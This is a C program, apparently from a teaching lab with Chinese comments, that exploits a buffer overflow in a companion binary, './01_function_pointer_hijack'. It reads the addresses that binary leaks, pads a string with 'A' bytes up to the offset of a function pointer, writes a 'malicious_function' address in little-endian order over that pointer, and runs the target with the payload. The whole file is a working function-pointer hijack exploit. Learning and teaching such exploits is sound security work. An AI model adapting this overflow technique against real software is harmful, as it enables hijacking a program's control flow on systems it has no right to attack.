#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    printf("=== 最终函数指针劫持攻击 ===\n\n");
    
    // 获取当前运行时的地址
    printf("1. 获取函数地址...\n");
    FILE *fp = popen("./01_function_pointer_hijack \"short\"", "r");
    if (!fp) {
        printf("无法执行程序获取地址\n");
        return 1;
    }
    
    char line[256];
    unsigned long malicious_addr = 0;
    unsigned long buffer_addr = 0;
    unsigned long func_ptr_addr = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "buffer地址:")) {
            sscanf(line, "buffer地址: %lx", &buffer_addr);
        }
        if (strstr(line, "func_ptr地址:")) {
            sscanf(line, "func_ptr地址: %lx", &func_ptr_addr);
        }
        if (strstr(line, "malicious_function地址:")) {
            sscanf(line, "malicious_function地址: %lx", &malicious_addr);
        }
    }
    pclose(fp);
    
    printf("   buffer地址: 0x%lx\n", buffer_addr);
    printf("   func_ptr地址: 0x%lx\n", func_ptr_addr);
    printf("   恶意函数地址: 0x%lx\n", malicious_addr);
    printf("   偏移: %ld 字节\n", func_ptr_addr - buffer_addr);
    printf("\n");
    
    // 构造攻击字符串
    printf("2. 构造攻击字符串...\n");
    size_t offset = func_ptr_addr - buffer_addr;
    size_t attack_size = offset + 8;
    
    char *attack = malloc(attack_size + 1);
    memset(attack, 'A', offset);
    
    // 写入恶意地址（小端序）
    for (int i = 0; i < 8; i++) {
        attack[offset + i] = (malicious_addr >> (i * 8)) & 0xFF;
    }
    attack[attack_size] = '\0';
    
    printf("   攻击字符串长度: %zu 字节\n", attack_size);
    printf("   地址字节: ");
    for (int i = 0; i < 8; i++) {
        printf("\\x%02x", (unsigned char)attack[offset + i]);
    }
    printf("\n\n");
    
    // 执行攻击
    printf("3. 执行攻击...\n");
    char *argv[] = {"./01_function_pointer_hijack", attack, NULL};
    execv("./01_function_pointer_hijack", argv);
    
    // 如果execv失败
    perror("execv失败");
    free(attack);
    return 1;
}
